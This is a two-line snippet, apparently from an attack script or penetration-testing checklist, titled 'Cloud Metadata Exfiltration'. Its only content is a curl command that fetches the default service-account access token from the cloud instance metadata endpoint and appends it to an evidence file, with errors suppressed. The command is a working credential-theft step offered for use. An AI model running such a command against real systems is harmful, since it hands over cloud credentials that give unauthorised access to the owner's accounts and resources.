# 1. Cloud Metadata Exfiltration
	curl -s -m 5 -H "Metadata: true" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" >> evidence.txt || true
